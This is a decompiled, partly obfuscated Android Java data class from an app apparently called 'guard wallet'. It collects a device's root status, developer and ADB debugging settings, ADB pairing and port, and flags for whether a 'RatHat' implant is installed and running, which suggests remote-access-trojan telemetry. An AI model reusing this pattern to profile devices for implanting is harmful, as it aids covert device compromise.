package com.guard.wallet.resp;

import a1.AbstractC0026q;
import android.support.annotation.NonNull;
import com.guard.wallet.entity.ADBConfig;
import com.guard.wallet.req.MessageBodyVO;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;

/* loaded from: classes.dex */
public class DeviceDebugVO extends MessageBodyVO {
    private Integer deviceConnected;
    private Integer deviceDebugPort;
    private Integer devicePaired;
    private Integer enableDebug;
    private Integer enableDevelopment;
    private Integer enableWifiDebug;
    private Integer isRoot;
    private Integer ratHatImplant;
    private Integer ratHatRunning;

    public DeviceDebugVO() {
    }

    public DeviceDebugVO(Integer num, Integer num2, Integer num3, Integer num4, Integer num5, Integer num6, Integer num7, Integer num8, Integer num9) {
        this.isRoot = num;
        this.enableDevelopment = num2;
        this.enableDebug = num3;
        this.enableWifiDebug = num4;
        this.ratHatImplant = num5;
        this.ratHatRunning = num6;
        this.deviceDebugPort = num7;
        this.devicePaired = num8;
        this.deviceConnected = num9;
    }

    public static DeviceDebugVO of() {
        DeviceDebugVO onlyDebug = onlyDebug();
        ADBConfig m689J = AbstractC0252h.m689J();
        onlyDebug.setRatHatImplant(Integer.valueOf(m689J.getInstalledRatHat()));
        onlyDebug.setRatHatRunning(Integer.valueOf(m689J.getIsRatHatRunning()));
        onlyDebug.setDevicePaired(Integer.valueOf(m689J.isPaired() ? 1 : 0));
        onlyDebug.setDeviceConnected(Integer.valueOf(m689J.isConnected() ? 1 : 0));
        onlyDebug.setDeviceDebugPort(m689J.getDebugPort());
        return onlyDebug;
    }

    public static DeviceDebugVO onlyDebug() {
        DeviceDebugVO deviceDebugVO = new DeviceDebugVO();
        if (AbstractC0026q.m175e()) {
            deviceDebugVO.setIsRoot(1);
        } else {
            deviceDebugVO.setIsRoot(0);
        }
        if (AbstractC0251g.m638K()) {
            deviceDebugVO.setEnableDevelopment(1);
        } else {
            deviceDebugVO.setEnableDevelopment(0);
        }
        if (AbstractC0251g.m636I()) {
            deviceDebugVO.setEnableDebug(1);
        } else {
            deviceDebugVO.setEnableDebug(0);
        }
        if (AbstractC0251g.m637J()) {
            deviceDebugVO.setEnableWifiDebug(1);
        } else {
            deviceDebugVO.setEnableWifiDebug(0);
        }
        return deviceDebugVO;
    }

    public Integer getDeviceConnected() {
        return this.deviceConnected;
    }

    public Integer getDeviceDebugPort() {
        return this.deviceDebugPort;
    }

    public Integer getDevicePaired() {
        return this.devicePaired;
    }

    public Integer getEnableDebug() {
        return this.enableDebug;
    }

    public Integer getEnableDevelopment() {
        return this.enableDevelopment;
    }

    public Integer getEnableWifiDebug() {
        return this.enableWifiDebug;
    }

    public Integer getIsRoot() {
        return this.isRoot;
    }

    public Integer getRatHatImplant() {
        return this.ratHatImplant;
    }

    public Integer getRatHatRunning() {
        return this.ratHatRunning;
    }

    public void setDeviceConnected(Integer num) {
        this.deviceConnected = num;
    }

    public void setDeviceDebugPort(Integer num) {
        this.deviceDebugPort = num;
    }

    public void setDevicePaired(Integer num) {
        this.devicePaired = num;
    }

    public void setEnableDebug(Integer num) {
        this.enableDebug = num;
    }

    public void setEnableDevelopment(Integer num) {
        this.enableDevelopment = num;
    }

    public void setEnableWifiDebug(Integer num) {
        this.enableWifiDebug = num;
    }

    public void setIsRoot(Integer num) {
        this.isRoot = num;
    }

    public void setRatHatImplant(Integer num) {
        this.ratHatImplant = num;
    }

    public void setRatHatRunning(Integer num) {
        this.ratHatRunning = num;
    }

    @NonNull
    public String toString() {
        return "DeviceDebugVO{isRoot=" + this.isRoot + ", enableDevelopment=" + this.enableDevelopment + ", enableDebug=" + this.enableDebug + ", enableWifiDebug=" + this.enableWifiDebug + ", ratHatImplant=" + this.ratHatImplant + ", ratHatRunning=" + this.ratHatRunning + ", deviceDebugPort=" + this.deviceDebugPort + ", devicePaired=" + this.devicePaired + ", deviceConnected=" + this.deviceConnected + '}';
    }
}
